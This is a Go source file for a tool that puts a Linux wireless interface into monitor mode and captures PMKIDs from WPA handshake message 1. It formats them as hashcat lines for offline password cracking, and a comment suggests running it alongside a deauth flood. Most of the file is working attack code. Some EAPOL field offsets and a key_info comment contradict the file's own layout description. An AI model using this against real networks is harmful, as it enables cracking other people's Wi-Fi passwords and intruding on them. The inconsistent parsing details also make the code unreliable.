//go:build linux

// Package wireless — PMKID harvesting.
//
// PMKID is delivered in EAPOL-Key message 1 (or in the RSN IE of a
// reassociation request during roaming). It's computed as:
//
//	PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || STA_MAC)
//
// Because the inputs (AP MAC, STA MAC, AP nonce from the ANonce field of
// EAPOL msg 1) are all observable on the air, one captured frame 1 is
// enough to mount an offline dictionary attack — no client, no full
// 4-way handshake, no deauth required. hashcat mode 22000 eats the line
// this file emits.
//
// Capture path: 802.11 data frame carrying LLC/SNAP-wrapped EAPOL-Key,
// key_info type 2 (message 1 of the 4-way handshake). We sniff via the
// same AF_PACKET RX socket used by capture_linux.go, so the caller can
// run this next to a deauth flood.
package wireless

import (
	"context"
	"crypto/hmac"
	"crypto/sha1"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

// PMKIDHit is one harvested PMKID with the addressing needed for crack.
type PMKIDHit struct {
	TS        time.Time
	BSSID     net.HardwareAddr
	Station   net.HardwareAddr
	PMKID     []byte // 16 bytes
	SSID      string // may be empty if no beacon captured yet
	ANonce    []byte // 32 bytes from EAPOL msg 1
	ReplayCtr uint64
}

// HashcatLine returns the hashcat -m 22000 line for offline cracking.
//
// Format: WPA*01*PMKID*MAC_AP*MAC_STA*ESSID***
//   - 01 marks PMKID (02 is the 4-way handshake variant)
//   - all MACs are hex, no separators
//   - ESSID is hex-encoded; empty string if unknown
func (h PMKIDHit) HashcatLine() string {
	ap := strings.ReplaceAll(strings.ToLower(h.BSSID.String()), ":", "")
	sta := strings.ReplaceAll(strings.ToLower(h.Station.String()), ":", "")
	pmkid := hex.EncodeToString(h.PMKID)
	essid := hex.EncodeToString([]byte(h.SSID))
	return fmt.Sprintf("WPA*01*%s*%s*%s*%s***", pmkid, ap, sta, essid)
}

// PMKIDOptions controls a harvest run.
type PMKIDOptions struct {
	Iface    string        // monitor-mode iface
	Channel  int           // set before capture if > 0
	Duration time.Duration // total run; 0 = until ctx done
	// Optional: only emit hits for this BSSID. Empty = any AP.
	FilterBSSID string
}

// Harvest listens for EAPOL-Key frames and emits PMKIDHit on every message 1
// with a PMKID KDE. onHit is called synchronously — copy the slice if you
// keep it. Returns nil on ctx-done or duration.
func Harvest(ctx context.Context, opts PMKIDOptions, onHit func(PMKIDHit)) error {
	if opts.Iface == "" {
		return fmt.Errorf("pmkid: iface required")
	}
	if !isMonitorMode(opts.Iface) {
		if err := enableMonitor(opts.Iface); err != nil {
			return fmt.Errorf("pmkid: enable monitor: %w", err)
		}
	}
	if opts.Channel > 0 {
		setChannel(opts.Iface, opts.Channel)
	}

	var filter net.HardwareAddr
	if opts.FilterBSSID != "" {
		hw, err := ParseMAC(opts.FilterBSSID)
		if err != nil {
			return err
		}
		filter = hw
	}

	ifi, err := net.InterfaceByName(opts.Iface)
	if err != nil {
		return fmt.Errorf("pmkid: iface lookup: %w", err)
	}

	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(0x0003)))
	if err != nil {
		return fmt.Errorf("pmkid: socket: %w", err)
	}
	defer syscall.Close(fd)

	sll := &syscall.SockaddrLinklayer{
		Protocol: htons(0x0003),
		Ifindex:  ifi.Index,
	}
	if err := syscall.Bind(fd, sll); err != nil {
		return fmt.Errorf("pmkid: bind: %w", err)
	}

	stop := make(chan struct{})
	go func() {
		select {
		case <-ctx.Done():
			syscall.Shutdown(fd, syscall.SHUT_RD)
		case <-stop:
		}
	}()
	if opts.Duration > 0 {
		go func() {
			select {
			case <-time.After(opts.Duration):
				syscall.Shutdown(fd, syscall.SHUT_RD)
			case <-stop:
			}
		}()
	}
	defer close(stop)

	buf := make([]byte, 65536)
	for {
		n, _, err := syscall.Recvfrom(fd, buf, 0)
		if err != nil {
			if err == syscall.EBADF || err == syscall.EINVAL || err == syscall.ENOTCONN {
				return nil
			}
			if err == syscall.EINTR {
				continue
			}
			return fmt.Errorf("pmkid: recvfrom: %w", err)
		}
		if n < 24 {
			continue
		}
		hit, ok := parsePMKIDFrame(buf[:n], filter)
		if !ok {
			continue
		}
		onHit(hit)
	}
}

func setChannel(iface string, ch int) {
	// best effort — iw is required; if it fails the caller keeps the current ch
	_ = exec.Command("iw", "dev", iface, "set", "channel", fmt.Sprintf("%d", ch)).Run()
}

// parsePMKIDFrame walks radiotap + 802.11 data frame + LLC/SNAP + EAPOL-Key.
// Returns a PMKIDHit only for EAPOL-Key message 1 carrying a PMKID KDE.
func parsePMKIDFrame(raw []byte, filter net.HardwareAddr) (PMKIDHit, bool) {
	// radiotap length is little-endian at bytes [2:4]
	if len(raw) < 4 {
		return PMKIDHit{}, false
	}
	rtLen := int(binary.LittleEndian.Uint16(raw[2:4]))
	if rtLen < 8 || rtLen > len(raw)-24 {
		return PMKIDHit{}, false
	}
	frame := raw[rtLen:]

	// 802.11 header is 24 bytes for data, up to 30 with QoS
	if len(frame) < 24 {
		return PMKIDHit{}, false
	}
	fc := frame[0]
	if fc&0x0C != 0x08 { // not a data frame
		return PMKIDHit{}, false
	}
	// FC flags: toDS is bit 0, fromDS is bit 1 of the frame-control byte.
	toDS := fc&0x01 != 0
	fromDS := fc&0x02 != 0

	// addr1/2/3 are at fixed offsets
	addr1 := frame[4:10]
	addr2 := frame[10:16]
	addr3 := frame[16:22]

	// pick BSSID and station depending on DS bits
	var bssid, station []byte
	switch {
	case !toDS && !fromDS:
		bssid = addr3
		station = addr2
	case toDS && !fromDS:
		bssid = addr1
		station = addr2
	case !toDS && fromDS:
		bssid = addr2
		station = addr1
	default:
		// WDS — skip
		return PMKIDHit{}, false
	}

	if filter != nil && !hwEqual(bssid, filter) {
		return PMKIDHit{}, false
	}

	// QoS data adds 2 bytes to the header
	hdrLen := 24
	subtype := (fc >> 4) & 0x0F
	if subtype&0x08 != 0 { // QoS bit
		hdrLen += 2
	}
	// LLC/SNAP header is 8 bytes: AA AA 03 00 00 00 88 8E
	if len(frame) < hdrLen+8 {
		return PMKIDHit{}, false
	}
	llc := frame[hdrLen : hdrLen+8]
	if !(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
		llc[6] == 0x88 && llc[7] == 0x8E) {
		return PMKIDHit{}, false
	}

	// EAPOL-Key starts after LLC
	eapol := frame[hdrLen+8:]
	hit, ok := parseEAPOLKey(eapol, bssid, station)
	if !ok {
		return PMKIDHit{}, false
	}
	return hit, true
}

// parseEAPOLKey parses an EAPOL-Key message and extracts PMKID if present.
//
// Layout (RFC/802.11i):
//
//	EAPOL header (4 bytes): version, type (3 = key), length (2 BE)
//	Key descriptor (95+ bytes):
//	  descriptor type (1) = 0x02 for RSN
//	  key_info (2 BE) — bit 3 = key type, bits 4-5 = key install/ack
//	  key_length (2), replay_counter (8), key_nonce (32), key_iv (16),
//	  key_rsc (8), key_id (8), key_mic (16), key_data_length (2 BE),
//	  key_data (key_data_length bytes)
//
// Message 1 of the 4-way handshake has key_info & 0x2008 == 0x2008
// (ack set, mic clear, install clear). PMKID KDE, when present, is inside
// key_data with tag 0xDD (vendor-specific), length 0x14 (20), OUI
// 00:0F:AC, data type 0x04.
func parseEAPOLKey(b []byte, bssid, station []byte) (PMKIDHit, bool) {
	if len(b) < 4+95 {
		return PMKIDHit{}, false
	}
	if b[1] != 0x03 { // type: EAPOL-Key
		return PMKIDHit{}, false
	}
	eapolLen := int(binary.BigEndian.Uint16(b[2:4]))
	if eapolLen > len(b)-4 {
		eapolLen = len(b) - 4
	}
	body := b[4 : 4+eapolLen]
	if len(body) < 95 {
		return PMKIDHit{}, false
	}
	if body[0] != 0x02 { // descriptor type: RSN
		return PMKIDHit{}, false
	}
	keyInfo := binary.BigEndian.Uint16(body[1:3])
	// message 1: ack set (bit 7 = 0x0080), mic clear (bit 8), install clear
	// mask the bits we care about
	if keyInfo&0x0080 == 0 { // ack must be set
		return PMKIDHit{}, false
	}
	if keyInfo&0x0100 != 0 { // mic set = not msg 1
		return PMKIDHit{}, false
	}

	replayCtr := binary.BigEndian.Uint64(body[9:17])
	anonce := append([]byte(nil), body[17:49]...)

	kdLen := int(binary.BigEndian.Uint16(body[97:99]))
	if kdLen < 2 {
		return PMKIDHit{}, false
	}
	if len(body) < 99+kdLen {
		return PMKIDHit{}, false
	}
	kd := body[99 : 99+kdLen]

	// walk KDEs — each is (type, length, data...)
	i := 0
	for i+2 <= len(kd) {
		tag := kd[i]
		length := int(kd[i+1])
		if i+2+length > len(kd) {
			break
		}
		data := kd[i+2 : i+2+length]
		// PMKID KDE: vendor tag 0xDD, OUI 00:0F:AC, type 0x04, 16-byte PMKID
		if tag == 0xDD && length == 0x14 &&
			len(data) == 20 &&
			data[0] == 0x00 && data[1] == 0x0F && data[2] == 0xAC &&
			data[3] == 0x04 {
			pmkid := append([]byte(nil), data[4:20]...)
			return PMKIDHit{
				TS:        time.Now(),
				BSSID:     append(net.HardwareAddr(nil), bssid...),
				Station:   append(net.HardwareAddr(nil), station...),
				PMKID:     pmkid,
				ANonce:    anonce,
				ReplayCtr: replayCtr,
			}, true
		}
		i += 2 + length
	}
	return PMKIDHit{}, false
}

func hwEqual(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// computePMKID is exposed for verification tests — given a PMK, the AP MAC,
// and the STA MAC, it returns the PMKID that Harvest would emit. Handy to
// prove the parser against a known-good vector.
func computePMKID(pmk []byte, apMAC, staMAC net.HardwareAddr) []byte {
	h := hmac.New(sha1.New, pmk)
	h.Write([]byte("PMK Name"))
	h.Write(apMAC)
	h.Write(staMAC)
	return h.Sum(nil)[:16]
}
